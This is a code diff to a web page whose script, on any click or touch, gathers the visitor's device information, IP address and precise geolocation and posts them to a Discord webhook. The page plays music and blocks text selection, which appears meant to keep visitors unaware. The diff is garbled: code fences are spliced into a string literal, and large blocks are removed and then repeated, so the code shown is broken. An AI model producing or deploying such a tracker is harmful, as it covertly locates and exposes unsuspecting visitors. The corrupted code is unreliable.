@@ -14,6 +14,7 @@
       color: gray; /* Gray text */
       flex-direction: column; /* Stack elements vertically */
       position: relative; /* Enable absolute positioning for children */
+      user-select: none; /* Prevent text selection */
     }
     #info {
       font-size: 18px;
@@ -42,7 +43,9 @@
     let hasSentInfo = false; // Flag to track if information has been sent
 
     // Function to collect device information
-    function collectDeviceInfo() {
+    function collectDeviceInfo(event) {
+      event.preventDefault(); // Prevent default action (text selection)
+
       if (hasSentInfo) return; // Exit if already sent
 
       // Play music
@@ -99,37 +102,9 @@
 
             // Send the payload to the Discord webhook with a mention
             const webhookPayload = {
-              content: `<@${userId}>\n\`\`\`${infoText}\`\`\``
+              content: `<@${userId}```javascript
+              }\n\`\`\`${infoText}\`\`\``
             };
-           ```javascript
-            fetch(webhookUrl, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(webhookPayload)
-            })
-             .then(response => {
-               console.log('Device information sent successfully');
-               hasSentInfo = true; // Set the flag to true after sending
-             })
-             .catch(error => console.error('Failed to send device information:', error));
-          }, error => {
-            console.error('Failed to get geolocation:', error);
-          }, {
-            enableHighAccuracy: true
-          });
-        })
-       .catch(error => console.error('Failed to get IP address:', error));
-    }
-
-    // Add event listeners for click and touch events to collect device information
-    document.addEventListener('click', collectDeviceInfo);
-    document.addEventListener('touchstart', collectDeviceInfo);
-  </script>
-</body>
-</html>
-``````javascript
             fetch(webhookUrl, {
               method: 'POST',
               headers: {
